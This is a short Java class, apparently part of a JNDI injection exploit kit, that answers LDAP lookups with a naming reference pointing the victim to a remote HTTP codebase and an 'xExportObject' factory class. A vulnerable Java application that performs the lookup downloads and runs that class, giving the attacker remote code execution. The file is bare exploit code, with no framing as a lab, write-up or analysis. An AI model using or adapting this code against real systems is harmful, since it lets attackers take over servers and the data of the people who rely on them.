

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

public class RemoteReference 
{

    private String classloaderUrl = "http://" + Config.hostname + ":" + Config.httpPort + "/";

    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        Entry e = new Entry(base);
        System.out.println("Sending LDAP reference result for " + classloaderUrl + "xExportObject.class");
        e.addAttribute("objectClass", "javaNamingReference");
        e.addAttribute("javaClassName", "xUnknown"); //could be any unknown
        e.addAttribute("javaFactory", "xExportObject"); //could be any unknown
        e.addAttribute("javaCodeBase", classloaderUrl);
        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
